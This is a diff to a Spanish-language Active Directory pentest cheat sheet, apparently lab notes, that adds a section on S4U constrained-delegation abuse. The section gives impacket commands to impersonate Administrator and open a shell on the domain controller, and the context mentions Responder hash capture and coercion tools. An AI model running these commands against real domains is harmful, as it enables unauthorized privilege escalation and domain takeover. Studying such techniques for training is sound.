@@ -289,7 +289,7 @@ Get-NetComputer                   # nombre antiguo de Get-DomainComputer (PowerV
 
 > `net user /domain` y `Get-ADDefaultDomainPasswordPolicy` (secciones 11 y 12) son la versión "sin herramientas extra": van en cmd y en el módulo oficial de RSAT, sin importar ningún script.
 
-## 14. Capturar hashes NTLM con Responder /windows 
+## 14. Capturar hashes NTLM con Responder
 
 Sirve para cuando **no tienes credenciales** pero sí sabes que algún servicio va a tocar un recurso: lo obligas a autenticar contra tu máquina y te quedas con su hash NetNTLMv2.
 
@@ -345,3 +345,47 @@ Cuando el servicio lo procese, la conexión SMB vuelve a Responder y aparece:
 > Herramientas que fuerzan la autenticación de una máquina (coerción) cuando no hay servicio que rastree un compartido: `petitpotam`, `printerbug`, `spoolsample`. Recuerda que el antivirus de Windows se lleva estos binarios: descárgalos dentro de la VM.
 
 > Si el escaneo muestra `message signing: enabled and required` en SMB, el **relay SMB no va a funcionar** (como en PROXY): en ese caso solo queda el cracking offline.
+
+## 15. Delegación restringida con transición de protocolo (S4U)
+
+Abuso para cuando una cuenta tiene delegación restringida con *protocol transition* (se ve con `findDelegation`): permite pedir un ticket **como otro usuario** (incluso Administrator) sin conocer su contraseña.
+
+**1 · Ver la delegación:**
+
+```
+impacket-findDelegation <DOMINIO>/<usuario>:'<contraseña>' -dc-ip <IP_DC>
+```
+
+- En PROXY: `svc.scanner` → `Constrained w/ Protocol Transition` hacia `cifs/DC01`.
+
+**2 · `/etc/hosts` obligatorio** (si falta, `getST` falla con `KDC_ERR_S_PRINCIPAL_UNKNOWN`):
+
+```
+<IP_DC> <DC>.<dominio> <dominio> <DC>
+```
+
+**3 · Pedir el ticket (S4U2Self + S4U2Proxy):**
+
+```
+impacket-getST -spn cifs/<DC>.<dominio> -impersonate Administrator -dc-ip <IP_DC> <DOMINIO>/<usuario>:'<contraseña>'
+```
+
+Guarda un `.ccache` con el nombre del usuario impersonado + SPN.
+
+**4 · Usar el ticket:**
+
+```
+export KRB5CCNAME=./<nombre_del_fichero>.ccache
+impacket-smbexec -k -no-pass <DOMINIO>/Administrator@<DC>.<dominio>
+```
+
+- Si da errores raros (`No such file or directory`, `Name or service not known`): `unset KRB5CCNAME` y vuelve al paso 3 exportando el nombre **exacto** del fichero (`ls` para verlo).
+
+**Variantes en la AttackBox** (sin prefijo `impacket-`, con `.py`):
+
+```
+findDelegation.py <DOMINIO>/<usuario>:'<contraseña>' -dc-ip <IP_DC>
+getST.py -spn cifs/<DC>.<dominio> -impersonate Administrator -dc-ip <IP_DC> <DOMINIO>/<usuario>:'<contraseña>'
+export KRB5CCNAME=./<nombre_del_fichero>.ccache
+smbexec.py -k -no-pass <DOMINIO>/Administrator@<DC>.<dominio>
+```
